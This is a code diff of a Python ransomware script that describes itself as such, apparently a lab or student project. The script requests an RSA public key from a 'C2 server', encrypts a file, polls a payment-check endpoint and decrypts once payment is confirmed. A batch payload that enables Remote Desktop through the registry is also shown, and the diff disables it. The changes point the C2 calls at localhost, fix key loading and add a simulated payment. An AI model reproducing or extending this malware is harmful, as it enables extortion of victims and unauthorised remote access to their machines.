@@ -5,11 +5,11 @@ import sys
 import subprocess
 import requests
 import rsa
-
+'''
 print("Start Payload")
 
 # The content of the batch file that will be executed with administrator privileges
-batch_content = r'''@echo off
+batch_content = r''' '''@echo off
 :: Check if the script is running as administrator
 ::NET SESSION >nul 2>&1
 ::if %errorlevel% neq 0 (
@@ -55,7 +55,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnec
 gpupdate /force
 
 '''
-
+'''
 # Path where the batch file will be created
 batch_file = 'admin_script.bat'
 print("Just created the bat")
@@ -79,11 +79,11 @@ def windows_payload():
 
     os.remove("./admin_script.bat")
     os.remove("./extracted_payload.py")
-
+'''
 # connect to C2 server
 def c2_server():
     try:
-        response = requests.get("http://----:3000/gen-key") # send GET request for public key
+        response = requests.get("http://localhost:3000/gen-key") # send GET request for public key
         if response.status_code == 200:
             public_key = response.text.strip() # retrieve public key
             print("Public key had been received")
@@ -106,9 +106,13 @@ def enc_machine(public_key):
 
         with open("file_to_encrypt.txt", "rb") as f:
             data = f.read()
+
+        # pem format
+        if not public_key.startswith("-----BEGIN RSA PUBLIC KEY-----"):
+            public_key = "-----BEGIN RSA PUBLIC KEY-----\n" + public_key + "-----END RSA PUBLIC KEY-----"
         
         # rsa encryption: load the public key and encrypt
-        public_key = rsa.PublicKey.load_pkcs1(public_key) # convert key from pem to rsa
+        public_key = rsa.PublicKey.load_pkcs1(public_key.encode()) # convert key from pem to rsa
         encrypted_data = rsa.encrypt(data, public_key) # file data encryption
 
         # save the data to new file
@@ -121,9 +125,27 @@ def enc_machine(public_key):
             status.write("Encrypted!")
 
         # checking for a payment
-        #payment_check()
+        payment_check()
     except Exception as e:
         print(f"Encryption error: {e}")
+
+# simulate payment
+def payment_simlate():
+    try:
+        # read pub key
+        with open("public_key.pem", "r") as pub_key_file:
+            pub_key = pub_key_file.read().strip()
+
+        # Post to simulate payment
+        response = requests.post("http://localhost:3000/simulate-payment", json={"pub_key": pub_key})
+
+        if response.status_code == 200:
+            print("Payment successfull!")
+        else:
+            print(f"Failed payemnt: {response.status_code}")
+    except Exception as e:
+        print(f"Payment error: {e}")
+
 
 # POT request to check payemnt
 def payment_check():
@@ -133,7 +155,7 @@ def payment_check():
             pub_key = pub_key_file.read().strip()
 
         # send a POST request
-        response = requests.post("http://----:3000/check-payment", json={"pub_key": pub_key})
+        response = requests.post("http://localhost:3000/check-payment", json={"pub_key": pub_key})
 
         if response.status_code == 200:
             # decrypt the machine if payment is confirmed
@@ -153,7 +175,7 @@ def dec_machine():
             encrypted_data = enc_file.read()
         
         # send POSt to get prvate key
-        response = requests.post("http://----:3000/check-payment", json={"pub_key": pub_key})
+        response = requests.post("http://localhost:3000/check-payment", json={"pub_key": pub_key})
 
         if response.status_code == 200:
             # if private key is received, decrypt file
@@ -173,7 +195,7 @@ def dec_machine():
     except Exception as e:
         print(f"Error decrypting machine: {e}")
 
-windows_payload()
+#windows_payload()
 c2_server()
 
 
